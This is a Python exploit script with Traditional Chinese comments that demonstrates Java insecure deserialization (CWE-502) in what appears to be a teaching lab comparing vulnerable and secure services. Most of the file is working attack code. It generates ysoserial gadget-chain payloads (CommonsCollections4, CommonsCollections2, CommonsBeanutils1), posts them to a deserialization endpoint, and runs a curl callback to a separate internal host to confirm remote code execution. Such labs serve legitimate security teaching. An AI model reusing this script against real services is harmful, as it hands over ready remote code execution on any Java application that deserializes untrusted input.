#!/usr/bin/env python3
"""
A08:2021 - Insecure Deserialization Exploit
CWE-502: Deserialization of Untrusted Data

使用 ysoserial 產生惡意 Java 序列化 payload，
觸發 RCE (Remote Code Execution)

攻擊原理：
1. Java 的 ObjectInputStream.readObject() 會在反序列化時執行物件的
   readObject/readResolve 等方法
2. 如果 classpath 中有可利用的 "gadget chain"（如 commons-collections4），
   攻擊者可以串接這些物件來執行任意程式碼
3. 本範例使用 CommonsCollections4 gadget chain
"""

import requests
import subprocess
import base64
import os
import sys
import time

# 目標 URL
VULNERABLE_URL = "http://localhost:8081/api/integrity/deserialize"
SECURE_URL = "http://localhost:8082/api/integrity/deserialize"

# ysoserial 路徑（在 attacker 容器中）
YSOSERIAL_JAR = "/app/ysoserial-all.jar"

# 回調伺服器（內部 API 用於驗證 RCE）
CALLBACK_URL = "http://internal-api:9999/callback"


def generate_payload_with_ysoserial(command: str, gadget: str = "CommonsCollections4") -> bytes:
    """
    使用 ysoserial 產生惡意 payload
    
    Args:
        command: 要執行的系統命令
        gadget: Gadget chain 類型
        
    Returns:
        序列化的 payload 位元組
    """
    print(f"\n[*] 使用 ysoserial 產生 payload...")
    print(f"    Gadget: {gadget}")
    print(f"    Command: {command}")
    
    try:
        # 執行 ysoserial
        result = subprocess.run(
            ["java", "-jar", YSOSERIAL_JAR, gadget, command],
            capture_output=True
        )
        
        if result.returncode != 0:
            print(f"[!] ysoserial 錯誤: {result.stderr.decode()}")
            return None
            
        payload = result.stdout
        print(f"[+] Payload 大小: {len(payload)} bytes")
        return payload
        
    except FileNotFoundError:
        print("[!] 找不到 java 或 ysoserial")
        return None
    except Exception as e:
        print(f"[!] 產生 payload 失敗: {e}")
        return None


def generate_simple_payload() -> bytes:
    """
    產生簡單的 Java 序列化 payload（用於測試）
    這個 payload 只是一個普通的 HashMap，不含惡意內容
    """
    import struct
    
    # Java 序列化 magic number 和版本
    payload = bytes([
        0xAC, 0xED,  # STREAM_MAGIC
        0x00, 0x05,  # STREAM_VERSION
        0x73,        # TC_OBJECT
        0x72,        # TC_CLASSDESC
        0x00, 0x11,  # 類別名稱長度 (17)
    ])
    
    # 添加類別名稱 "java.util.HashMap"
    payload += b"java.util.HashMap"
    
    # 簡化的序列化資料
    payload += bytes([
        0x05, 0x07, 0xDA, 0xC1, 0xC3, 0x16, 0x60, 0xD1,  # serialVersionUID
        0x03,  # classDescFlags
        0x00, 0x02,  # 欄位數量
    ])
    
    return payload


def send_deserialization_attack(url: str, payload: bytes, use_base64: bool = False):
    """
    發送反序列化攻擊
    
    Args:
        url: 目標 URL
        payload: 序列化 payload
        use_base64: 是否使用 Base64 編碼方式
    """
    print(f"\n[*] 發送反序列化攻擊到: {url}")
    
    try:
        if use_base64:
            # Base64 編碼方式
            encoded = base64.b64encode(payload).decode()
            response = requests.post(
                url.replace("/deserialize", "/deserialize/base64"),
                json={"data": encoded},
                headers={"Content-Type": "application/json"},
                timeout=10
            )
        else:
            # 二進位方式
            response = requests.post(
                url,
                data=payload,
                headers={"Content-Type": "application/octet-stream"},
                timeout=10
            )
        
        print(f"[*] 回應狀態碼: {response.status_code}")
        print(f"[*] 回應內容:")
        print_response(response)
        
        return response
        
    except requests.exceptions.RequestException as e:
        print(f"[!] 請求失敗: {e}")
        return None


def print_response(response):
    """格式化輸出回應"""
    try:
        import json
        data = response.json()
        print(json.dumps(data, indent=2, ensure_ascii=False))
    except:
        print(response.text[:500])


def check_rce_callback():
    """
    檢查 RCE 是否成功（透過回調伺服器）
    """
    print("\n[*] 檢查 RCE 回調...")
    try:
        response = requests.get(
            "http://localhost:9999/callback/check",
            timeout=5
        )
        if response.status_code == 200:
            data = response.json()
            if data.get("received"):
                print("[+] ✓ RCE 回調成功！程式碼已執行！")
                return True
    except:
        pass
    print("[-] 未收到 RCE 回調")
    return False


def demo_attack_vulnerable():
    """
    對漏洞版本進行攻擊演示
    """
    print("\n" + "="*60)
    print("漏洞版本攻擊演示 (CWE-502)")
    print("="*60)
    
    # 產生 RCE payload（使用 curl 回調驗證）
    callback_cmd = f"curl -X POST {CALLBACK_URL}?source=deserialization"
    payload = generate_payload_with_ysoserial(callback_cmd)
    
    if payload:
        print("\n[1] 發送 CommonsCollections4 RCE payload...")
        send_deserialization_attack(VULNERABLE_URL, payload)
        time.sleep(2)
        check_rce_callback()
    else:
        print("\n[!] 無法產生 ysoserial payload，使用簡單測試 payload")
        simple_payload = generate_simple_payload()
        send_deserialization_attack(VULNERABLE_URL, simple_payload)
    
    # 嘗試不同的 gadget chains
    print("\n[2] 嘗試其他 gadget chains...")
    gadgets = ["CommonsCollections2", "CommonsCollections4", "CommonsBeanutils1"]
    
    for gadget in gadgets:
        print(f"\n--- 測試 {gadget} ---")
        payload = generate_payload_with_ysoserial("id", gadget)
        if payload:
            send_deserialization_attack(VULNERABLE_URL, payload)


def demo_attack_secure():
    """
    對安全版本進行攻擊演示（應該被阻擋）
    """
    print("\n" + "="*60)
    print("安全版本攻擊演示 - 應該被 ObjectInputFilter 阻擋")
    print("="*60)
    
    # 產生惡意 payload
    callback_cmd = f"curl -X POST {CALLBACK_URL}?source=deserialization_secure"
    payload = generate_payload_with_ysoserial(callback_cmd)
    
    if payload:
        print("\n[1] 發送惡意 payload 到安全版本...")
        response = send_deserialization_attack(SECURE_URL, payload)
        
        if response and response.status_code == 400:
            print("\n[+] ✓ 攻擊被成功阻擋！")
            print("[*] ObjectInputFilter 防護機制生效")
    else:
        # 使用簡單 payload 測試
        simple_payload = generate_simple_payload()
        send_deserialization_attack(SECURE_URL, simple_payload)
    
    # Base64 方式也被禁用
    print("\n[2] 測試 Base64 反序列化端點...")
    response = requests.post(
        SECURE_URL.replace("/deserialize", "/deserialize/base64"),
        json={"data": base64.b64encode(b"test").decode()},
        timeout=10
    )
    print_response(response)
    print("\n[+] ✓ 安全版本禁用了二進位反序列化，建議使用 JSON")


def main():
    """主函數"""
    print("""
╔═══════════════════════════════════════════════════════════════╗
║  A08:2021 - Insecure Deserialization Exploit                 ║
║  CWE-502: Deserialization of Untrusted Data                  ║
╠═══════════════════════════════════════════════════════════════╣
║  使用 ysoserial 產生 Java 反序列化 RCE payload              ║
║  利用 CommonsCollections4 gadget chain 執行任意程式碼       ║
╚═══════════════════════════════════════════════════════════════╝
    """)
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
        if target == "vulnerable":
            demo_attack_vulnerable()
        elif target == "secure":
            demo_attack_secure()
        elif target == "both":
            demo_attack_vulnerable()
            demo_attack_secure()
        else:
            print(f"用法: {sys.argv[0]} [vulnerable|secure|both]")
    else:
        # 預設執行完整演示
        demo_attack_vulnerable()
        print("\n" + "-"*60 + "\n")
        demo_attack_secure()
    
    print("\n[*] 演示完成")


if __name__ == "__main__":
    main()
